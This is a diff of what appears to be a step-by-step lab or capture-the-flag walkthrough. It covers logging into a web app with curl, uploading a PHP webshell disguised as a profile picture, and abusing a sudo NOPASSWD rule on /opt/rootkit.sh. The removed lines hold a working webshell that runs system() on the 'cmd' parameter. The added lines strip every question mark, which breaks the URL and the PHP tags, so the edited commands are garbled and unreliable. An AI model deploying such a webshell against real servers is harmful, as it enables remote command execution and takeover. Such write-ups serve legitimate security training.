@@ -47,7 +47,7 @@ curl -X POST http://$TARGET:8080/classes/Login.php?f=login \
 ```bash
 # What it does: fetch the user profile page using the authenticated session cookie.
 # Why here: extract required fields ('id', 'firstname', 'lastname', 'username') needed to submit the profile update form later.
-curl -X GET http://$TARGET:8080/?page=user \
+curl -X GET http://$TARGET:8080/page=user \
   -b cookies.txt \
   -o user_page.html
 ```
@@ -57,7 +57,7 @@ curl -X GET http://$TARGET:8080/?page=user \
 # What it does: create a simple PHP webshell that executes system commands via the 'cmd' GET parameter.
 # Why here: prepare the payload to be uploaded as a profile picture.
 cat > shell.php << 'EOF'
-<?php if(isset($_GET['cmd'])){ echo '<pre>'; $cmd = ($_GET['cmd']); system($cmd); echo '</pre>'; die; } ?>
+<php if(isset($_GET['cmd'])){ echo '<pre>'; $cmd = ($_GET['cmd']); system($cmd); echo '</pre>'; die; } >
 EOF
 ```
 
@@ -229,7 +229,7 @@ cat /opt/rootkit.sh
 (root) NOPASSWD: /bin/bash /opt/rootkit.sh
 
 #!/bin/bash
-read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;
+read -e -p "Would you like to versioncheck, update, list or read the report  " ans;
 # Execute your choice
 case $ans in
     versioncheck)
